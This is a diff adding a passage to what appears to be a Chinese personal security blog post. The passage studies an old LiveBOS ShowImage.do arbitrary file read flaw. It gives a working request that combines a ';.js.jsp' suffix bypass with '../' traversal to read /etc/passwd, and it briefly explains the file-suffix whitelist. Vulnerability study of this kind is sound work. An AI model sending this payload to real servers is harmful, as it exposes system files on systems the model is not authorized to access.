@@ -107,3 +107,30 @@ PublicRequestFilter、PrivateRequestFilter、AdminRequestFilter 都是需要sess
 ```
 
 ![image-20240715115157848](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20240715115157848.png)
+
+
+
+
+
+
+
+这里其实看J2EE框架这种很蒙，只会看一些.xml的配置，然后就是一个文件夹里面全是jsp，不知道从何开始看。。
+
+## 先看个老洞（LiveBOS ShowImage.do 任意文件读取漏洞)
+
+```plain
+/feed/ShowImage.do;.js.jsp?type=&imgName=../../../../../../../../../../../../../../../etc/passwd
+```
+
+取出最后一个点后面的为后缀名
+然后type的值需要是小写字母
+
+后缀白名单
+
+```java
+jpeg 、jpg 、png、。。。。图片音频那些，然后对应的加前缀  video/  或者 image/
+```
+
+
+
+![image-20240715174728154](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20240715174728154.png)
